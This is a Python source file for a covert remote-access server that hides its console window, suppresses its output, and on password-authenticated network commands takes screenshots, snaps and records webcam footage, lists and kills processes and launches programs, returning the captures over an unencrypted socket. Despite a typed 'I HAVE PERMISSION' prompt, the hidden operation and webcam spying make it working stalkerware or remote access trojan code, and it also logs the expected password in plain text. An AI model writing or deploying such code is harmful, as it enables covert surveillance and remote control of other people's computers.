# hidden_server.py
# Updated: Fixed file transfer protocol - always send 8-byte length header after JSON (0 if no file).
# This prevents client hanging. Added import zipfile at top. Improved logging. Ensured password handling is robust.
# Made CV2 optional. Detects and prints local IP for easy copy-paste.
# RUN ONLY on machines YOU OWN or where you have EXPLICIT permission.
# The server listens on port 12345 on all interfaces (0.0.0.0).
# WARNING: Password protects, but use firewall. No encryption.
# Requirements: pip install pyautogui psutil (opencv-python optional for webcam)

import os
import sys
import time
import subprocess
import socket
import json
import io
import threading
import logging
import struct
import zipfile  # For harmless files
from pathlib import Path
from datetime import datetime

# Set up logging to file for debugging (silent otherwise)
DL = Path.home() / "Downloads"
DL.mkdir(exist_ok=True)
log_file = DL / f"hidden_server_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
console_handler = logging.StreamHandler(sys.stderr)
console_handler.setLevel(logging.CRITICAL)
logging.getLogger().addHandler(console_handler)

# Core imports (required)
try:
    import pyautogui
    import psutil
    logging.info("Core libraries loaded successfully.")
except Exception as e:
    logging.error(f"Missing core libraries: {e}")
    print(f"Missing core libraries: {e}. Install: pip install pyautogui psutil", file=sys.stderr)
    sys.exit(1)

# Optional: CV2 for webcam
cv2_available = False
try:
    import cv2
    cv2_available = True
    logging.info("OpenCV loaded successfully.")
except ImportError:
    logging.warning("OpenCV (cv2) not installed. Webcam features disabled.")

TS = lambda: datetime.now().strftime("%Y%m%d_%H%M%S")

# Recording state
record_state = {"active": False, "cap": None, "writer": None, "file": None}

password = None

def get_local_ip():
    """Get the local IP address for the network."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def require_consent_and_password():
    print("!!! IMPORTANT: Run this ONLY on machines you own or with explicit permission.")
    print(f"Webcam support: {'Available' if cv2_available else 'Disabled (install opencv-python)'}")
    ans = input("Type 'I HAVE PERMISSION' to continue: ").strip().upper()
    if ans != "I HAVE PERMISSION":
        print("Permission not confirmed. Exiting.")
        sys.exit(1)
    global password
    password = input("Set a password for remote access: ").strip()
    if not password:
        print("No password set. Exiting.")
        sys.exit(1)
    logging.info(f"Password set (length: {len(password)})")
    # Hide console after setup
    if os.name == 'nt':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            logging.info("Console hidden.")
        except Exception as e:
            logging.error(f"Failed to hide console: {e}")
    local_ip = get_local_ip()
    print(f"Server ready! Local IP: {local_ip}:12345")
    print("Paste this IP (e.g., 192.168.1.100) into client host field, then enter password.")
    input("Press Enter to hide and start server...")  # Pause to read IP
    logging.info(f"Server starting on {local_ip}:12345")

def check_auth(req):
    client_pass = req.get("password", "").strip()
    if client_pass != password:
        logging.warning(f"Auth failed: provided '{client_pass}' vs expected '{password}'")
        return False, "Invalid password."
    return True, None

def take_screenshot():
    try:
        img = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        file_data = img_bytes.getvalue()
        filename = f"screenshot_{TS()}.png"
        logging.info(f"Screenshot captured: {filename}")
        return {"status": "ok", "messages": ["Screenshot taken."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Screenshot failed: {e}")
        return {"status": "error", "messages": [f"Screenshot failed: {e}"]}

def typed_capture_remote(text):
    try:
        text = text.strip()
        if not text:
            return {"status": "ok", "messages": ["No text provided."]}
        out_text = f"Remote typed input: {text}\nTimestamp: {TS()}"
        filename = f"typed_input_{TS()}.txt"
        file_data = out_text.encode('utf-8')
        logging.info(f"Typed capture: {len(text)} chars")
        return {"status": "ok", "messages": ["Typed input processed."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Typed capture failed: {e}")
        return {"status": "error", "messages": [f"Typed capture failed: {e}"]}

def list_processes(limit=300):
    try:
        processes = []
        cnt = 0
        for p in psutil.process_iter(['pid', 'name', 'username']):
            try:
                info = p.info
                processes.append(f"{info['pid']:6}  {str(info.get('username',''))[:15]:15}  {info.get('name','')}")
                cnt += 1
                if cnt >= limit:
                    break
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        processes.append(f"... shown {min(cnt, limit)} processes (total may be higher)")
        logging.info(f"Listed {cnt} processes")
        return {"status": "ok", "messages": processes}
    except Exception as e:
        logging.error(f"List processes failed: {e}")
        return {"status": "error", "messages": [f"List processes failed: {e}"]}

def close_specific_process_remote(name):
    try:
        name = name.strip()
        if not name:
            return {"status": "ok", "messages": ["No name provided."]}
        found = False
        for p in psutil.process_iter(['pid','name']):
            try:
                info = p.info
                if info.get('name','').lower() == name.lower():
                    try:
                        p.terminate()
                        p.wait(timeout=3)
                        found = True
                    except Exception:
                        try:
                            p.kill()
                            found = True
                        except Exception:
                            pass
                    logging.info(f"Terminated process: {name} (PID {p.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        msg = "Process terminated." if found else "No matching processes found."
        return {"status": "ok", "messages": [msg]}
    except Exception as e:
        logging.error(f"Close process failed: {e}")
        return {"status": "error", "messages": [f"Close process failed: {e}"]}

def generate_harmless_files():
    try:
        harmless_data = []
        for i in range(1,4):
            content = f"hahahhhhhhjjhhh\nharmless generated file {i}.\nTimestamp: {TS()}\n"
            harmless_data.append({"name": f"harmless_generated_{i}_{TS()}.txt", "data": content.encode('utf-8')})
        zip_bytes = io.BytesIO()
        with zipfile.ZipFile(zip_bytes, 'w') as zf:
            for item in harmless_data:
                zf.writestr(item["name"], item["data"])
        file_data = zip_bytes.getvalue()
        filename = f"harmless_files_{TS()}.zip"
        logging.info(f"Generated harmless zip: {filename}")
        return {"status": "ok", "messages": ["Harmless files generated and zipped."], "file_data": file_data, "filename": filename}
    except Exception as e:
        logging.error(f"Generate files failed: {e}")
        return {"status": "error", "messages": [f"Generate files failed: {e}"]}

def open_program_remote(cmd):
    try:
        cmd = cmd.strip()
        if not cmd:
            return {"status": "ok", "messages": ["No command provided."]}
        if os.name == 'nt':
            os.startfile(cmd)
        else:
            subprocess.Popen(cmd.split())
        logging.info(f"Launched program: {cmd}")
        return {"status": "ok", "messages": ["Program launched."]}
    except Exception as e:
        logging.error(f"Open program failed: {e}")
        return {"status": "error", "messages": [f"Open program failed: {e}"]}

def take_webcam_photo():
    if not cv2_available:
        return {"status": "error", "messages": ["Webcam support disabled. Install opencv-python."]}
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            cap.release()
            return {"status": "error", "messages": ["Could not open webcam."]}
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            file_data = buf.tobytes()
            filename = f"webcam_{TS()}.jpg"
            logging.info(f"Webcam photo captured: {filename}")
            return {"status": "ok", "messages": ["Webcam photo taken."], "file_data": file_data, "filename": filename}
        else:
            return {"status": "error", "messages": ["Failed to capture webcam frame."]}
    except Exception as e:
        logging.error(f"Webcam photo failed: {e}")
        return {"status": "error", "messages": [f"Webcam photo failed: {e}"]}

def toggle_webcam_recording():
    if not cv2_available:
        return {"status": "error", "messages": ["Webcam support disabled. Install opencv-python."]}
    try:
        was_active = record_state["active"]
        if not was_active:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                cap.release()
                return {"status": "error", "messages": ["Could not open webcam for recording."]}
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH) or 640)
            h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT) or 480)
            fname = f"webcam_rec_{TS()}.avi"
            full_path = DL / fname
            writer = cv2.VideoWriter(str(full_path), fourcc, 20.0, (w, h))
            record_state.update(active=True, cap=cap, writer=writer, file=str(full_path))
            logging.info("Webcam recording started")
            return {"status": "ok", "messages": ["Webcam recording started."]}
        else:
            record_state["active"] = False
            if record_state["cap"]:
                record_state["cap"].release()
            if record_state["writer"]:
                record_state["writer"].release()
            file_path = record_state.get("file")
            record_state.update(cap=None, writer=None, file=None)
            logging.info("Webcam recording stopped")
            if file_path and os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                os.remove(file_path)
                filename = os.path.basename(file_path)
                return {"status": "ok", "messages": ["Webcam recording stopped."], "file_data": file_data, "filename": filename}
            return {"status": "ok", "messages": ["Webcam recording stopped (no file)."]}
    except Exception as e:
        logging.error(f"Toggle recording failed: {e}")
        return {"status": "error", "messages": [f"Toggle recording failed: {e}"]}

def recording_frame_poll():
    if not cv2_available or not record_state["active"]:
        return
    rs = record_state
    if rs["cap"] and rs["writer"]:
        ok, frame = rs["cap"].read()
        if ok:
            rs["writer"].write(frame)
        else:
            toggle_webcam_recording()
            logging.error("Frame read failed; stopping recording.")

def recording_daemon():
    while True:
        recording_frame_poll()
        time.sleep(0.05)

def handle_command(req):
    auth_ok, auth_msg = check_auth(req)
    if not auth_ok:
        return {"status": "error", "messages": [auth_msg]}
    cmd = req.get("command", "").strip()
    logging.info(f"Handling command: {cmd}")
    try:
        if cmd == "take_screenshot":
            return take_screenshot()
        elif cmd == "typed_capture":
            text = req.get("text", "")
            return typed_capture_remote(text)
        elif cmd == "list_processes":
            limit = int(req.get("limit", 300))
            return list_processes(limit)
        elif cmd == "close_process":
            name = req.get("name", "")
            return close_specific_process_remote(name)
        elif cmd == "generate_harmless_files":
            return generate_harmless_files()
        elif cmd == "open_program":
            cmd_arg = req.get("cmd", "")
            return open_program_remote(cmd_arg)
        elif cmd == "take_webcam_photo":
            return take_webcam_photo()
        elif cmd == "toggle_webcam_recording":
            return toggle_webcam_recording()
        else:
            return {"status": "error", "messages": [f"Unknown command '{cmd}'"]}
    except Exception as e:
        logging.error(f"Handle command failed for {cmd}: {e}")
        return {"status": "error", "messages": [f"Command failed: {e}"]}

def socket_handler(conn, addr):
    logging.info(f"Client connected from {addr}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            req_str = data.decode('utf-8')
            req = json.loads(req_str)
            resp = handle_command(req)
            # Send JSON without file_data
            json_resp = {k: v for k, v in resp.items() if k not in ['file_data']}
            resp_str = json.dumps(json_resp)
            conn.send(resp_str.encode('utf-8'))
            # Always send file length header (0 if no file)
            file_data = resp.get('file_data', b'')
            file_len = len(file_data)
            conn.send(struct.pack('Q', file_len))
            if file_len > 0:
                conn.send(file_data)
                logging.info(f"Sent file: {resp.get('filename', 'unknown')} ({file_len} bytes)")
    except Exception as e:
        logging.error(f"Socket handler error with {addr}: {e}")
    finally:
        conn.close()
        logging.info(f"Client {addr} disconnected")

def start_server():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', 12345))
        server_socket.listen(5)
        logging.info("Server listening on 0.0.0.0:12345")
    except Exception as e:
        logging.error(f"Server start failed: {e}")
        print(f"Server failed to start: {e}", file=sys.stderr)
        sys.exit(1)
    while True:
        try:
            conn, addr = server_socket.accept()
            client_thread = threading.Thread(target=socket_handler, args=(conn, addr), daemon=True)
            client_thread.start()
        except Exception as e:
            logging.error(f"Accept error: {e}")

if __name__ == "__main__":
    require_consent_and_password()
    # Suppress stdout/stderr after setup
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    recording_thread = threading.Thread(target=recording_daemon, daemon=True)
    recording_thread.start()
    while True:
        time.sleep(1)